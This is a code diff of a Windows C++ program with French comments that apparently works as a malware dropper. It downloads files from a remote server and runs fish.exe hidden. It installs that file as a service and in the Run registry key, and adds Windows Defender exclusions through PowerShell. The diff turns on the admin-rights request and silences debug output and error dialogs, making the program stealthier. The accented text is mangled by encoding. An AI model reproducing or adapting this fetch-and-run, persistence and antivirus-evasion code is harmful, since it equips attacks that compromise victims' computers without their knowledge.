@@ -19,7 +19,7 @@ using namespace std;
 const string SERVER_URL = "https://arthur.xn--pruvost-rivire-6jb.fr/cdn/";
 const string FILE_LIST = "files.txt";
 
-// Fonction pour exécuter un fichier
+// Fonction pour exï¿½cuter un fichier
 void ExecuteFile(const string& filePath) {
     ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
 }
@@ -46,7 +46,7 @@ bool InstallService(const string& serviceName, const string& exePath) {
     return true;
 }
 
-// Fonction pour éxécuter fish au démarrage
+// Fonction pour ï¿½xï¿½cuter fish au dï¿½marrage
 void AddToStartup() {
     HKEY hKey;
     const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
@@ -63,7 +63,7 @@ void AddToStartup() {
     }
 }
 
-// Fonction qui ajoute une exclusion à windows defender
+// Fonction qui ajoute une exclusion ï¿½ windows defender
 void AddDefenderExclusion(const string& folderPath) {
     string command = "powershell -Command \"Set-MpPreference -ExclusionPath '" + folderPath + "'\"";
     STARTUPINFOA si = { sizeof(si) };
@@ -82,7 +82,7 @@ void downloadFile(const string& url, const string& localPath) {
 
 int main() {
 
-    //RequestAdminPrivileges();
+    RequestAdminPrivileges();
     
     string userFolder = GetUserFolderPath();
     if (userFolder.empty()) {
@@ -98,7 +98,7 @@ int main() {
 
     string fileListPath = fishFolder + "\\" + FILE_LIST;
     if (!DownloadFile(SERVER_URL + FILE_LIST, fileListPath)) {
-        MessageBox(NULL, "Échec du téléchargement de files.txt", "Erreur", MB_OK | MB_ICONERROR);
+        MessageBox(NULL, "ï¿½chec du tï¿½lï¿½chargement de files.txt", "Erreur", MB_OK | MB_ICONERROR);
         return 1;
     }
 
@@ -108,16 +108,16 @@ int main() {
         string url = SERVER_URL + file;
         string localPath = fishFolder + "\\" + file;
 
-        cout << "Début du téléchargement de : " << url << endl;
+        //cout << "Dï¿½but du tï¿½lï¿½chargement de : " << url << endl;
 
-        // Téléchargement bloquant
+        // Tï¿½lï¿½chargement bloquant
         if (!DownloadFile(url, localPath)) {
-            cout << "Échec du téléchargement de : " << url << endl;
-            MessageBox(NULL, ("Échec du téléchargement de " + file).c_str(), "Erreur", MB_OK | MB_ICONERROR);
+            //cout << "ï¿½chec du tï¿½lï¿½chargement de : " << url << endl;
+            //MessageBox(NULL, ("ï¿½chec du tï¿½lï¿½chargement de " + file).c_str(), "Erreur", MB_OK | MB_ICONERROR);
             return 1;
         }
 
-        cout << "Téléchargement réussi de : " << url << " vers " << localPath << endl;
+        //cout << "Tï¿½lï¿½chargement rï¿½ussi de : " << url << " vers " << localPath << endl;
     }
 
     // Lancer fish.exe
@@ -128,13 +128,13 @@ int main() {
     // Installer le service Windows
     InstallService("fish", fishPath);
 
-    // Ajouter au démarrage
+    // Ajouter au dï¿½marrage
     AddToStartup();
 
-    // Bloc de debug à supprimer au déploiement final
-    cout << fishPath << endl;
-    cout << userFolder << endl;
-    cout << fishFolder << endl;
+    // Bloc de debug ï¿½ supprimer au dï¿½ploiement final
+    //cout << fishPath << endl;
+    //cout << userFolder << endl;
+    //cout << fishFolder << endl;
 
     // Ajouter trois exclusion antivirus
     AddDefenderExclusion(fishPath);
